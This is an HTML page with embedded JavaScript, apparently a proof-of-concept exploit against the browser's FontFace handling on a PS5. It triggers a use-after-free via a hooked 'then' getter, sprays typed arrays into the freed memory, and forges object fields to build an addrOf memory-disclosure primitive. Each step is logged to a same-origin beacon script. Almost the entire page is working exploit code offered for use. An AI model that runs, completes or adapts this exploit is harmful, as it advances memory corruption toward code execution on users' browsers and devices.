<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>PS5 Recon</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 15px/1.3 ui-monospace,monospace;padding:13px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#log{margin:58px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:#53d0e8;font-weight:700}.r .n{color:var(--dim)}
.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red)}.r.bad .t{color:var(--red)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">P1322 — addrOf via setFamily. Fresh-open each try (no auto-reload).</div>
<div id="log"></div>
<script>
'use strict';
var LOG=document.getElementById('log'),BN=document.getElementById('bn'),_c=0;
function S(x,col){BN.textContent=x;BN.style.background=col||'#1b2330';}
function kls(s){s=(''+s).toLowerCase();if(/win|addrof/.test(s))return'win';if(/hit|ok|dangling|done/.test(s))return'ok';if(/err|miss|fail|crash|null/.test(s))return'bad';return'';}
function row(t,d,c){_c++;var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='n'>"+_c+"</span> <span class='t'>"+(''+t).replace(/[<>&]/g,'')+"</span>"+(d?" <span>"+(''+d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);while(LOG.childNodes.length>24)LOG.removeChild(LOG.firstChild);}
function B(tag,data){row(tag,data,kls(tag+' '+(data||'')));try{var s=(''+(data||'')).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,300);var u='/beacon.php?tag=P1322-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,70)+'@'+l);};
B('VER','1');

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
function wq(u,o,v){for(var i=0;i<8;i++){u[o+i]=Number(v&0xFFn);v>>=8n;}}
var buf=null,L1=null,L2=null,W=null,K=32,fired=false,sp=[],fs=null;

try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
 fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('SETUP-ERR',(''+e).slice(0,40));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
 if(fired)return undefined;fired=true;
 try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
 for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(192));w[0x82]=3;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;sp.push(w);}
 return undefined;},set:function(){}});
try{document.fonts.load('1em vf, v1','AB').then(function(f){window.__lf=f;setTimeout(scan,80);},function(){setTimeout(scan,80);});}catch(e){B('LOAD-ERR',(''+e).slice(0,40));}
setTimeout(function(){if(!buf)scan();},450);

function scan(){
 if(buf)return;var hit=-1;
 for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){L1=a;L2=le(sp[i],0x68);buf=sp[i];hit=i;break;}}
 if(hit<0){B('MISS','CLOSE+REOPEN for a fresh try');S('miss — fresh-open','#4a2a12');return;}
 B('HIT','L1=0x'+L1.toString(16));
 var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(window.__lf[i]);
 buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i].status;}catch(e){}if(st==='error'){W=cands[i];break;}}
 buf[0x82]=3;
 if(!W){B('NOT-DANGLE','fresh-open to retry');S('not dangling — fresh-open','#4a2a12');return;}
 B('DANGLING-OK','');S('dangling — addrOf attempt…','#0c7a3a');
 setTimeout(go,100);
}

/* setFamily writes m_family(0x18)=&CSSValueList BEFORE touching mutableProperties().
   Forge m_propertiesOrCSSConnection(0x08)=L1 (variant index 0) so mutableProperties() returns a
   real object and survives; zero m_clients so iterateClients is a no-op. Then read buf[0x18]. */
function go(){
 if(window.__g)return;window.__g=true;
 for(var i=0x58;i<0x68;i++)buf[i]=0;            /* m_clients empty */
 wq(buf,0x08,L1); buf[0x10]=0;                   /* m_propertiesOrCSSConnection = L1, variant idx 0 */
 B('PRE','0x08=L1 0x18pre=0x'+le(buf,0x18).toString(16));
 var done=false;
 try{ W.family='ABCDEFGH'; done=true; B('FAM-DONE','survived'); }
 catch(e){ B('FAM-ERR',(''+(e&&e.message||e)).slice(0,50)); }
 var v18=le(buf,0x18);
 B('READ-0x18','0x'+v18.toString(16));
 if(v18!==0n && v18>=0x1000000000n && v18<0x9000000000n){
   B('ADDROF','CSSValueList @ 0x'+v18.toString(16)+' (controlled-content object) — addrOf WORKS!');
   S('ADDROF !!! tell AI','#0a7a2a');
 } else if(v18!==0n){ B('READ-0x18-other','non-heap: 0x'+v18.toString(16)); }
 else { B('READ-0x18-null','still 0 — setFamily did not write m_family'); }
 /* also try unicodeRange -> buf[0x20] (no mutableProperties per CSSFontFace.cpp) */
 B('PRE-ur','0x20pre=0x'+le(buf,0x20).toString(16));
 try{ W.unicodeRange='U+1234-5678'; B('UR-DONE','survived'); }catch(e){ B('UR-ERR',(''+(e&&e.message||e)).slice(0,50)); }
 var v20=le(buf,0x20);
 B('READ-0x20','0x'+v20.toString(16));
 if(v20!==0n && v20>=0x1000000000n && v20<0x9000000000n){ B('ADDROF-ur','UnicodeRange array @ 0x'+v20.toString(16)+' — addrOf via unicodeRange!');S('ADDROF (ur) !!!','#0a7a2a'); }
 B('DONE','');S('done — press run button','#1b2330');
}
</script>
</body></html>
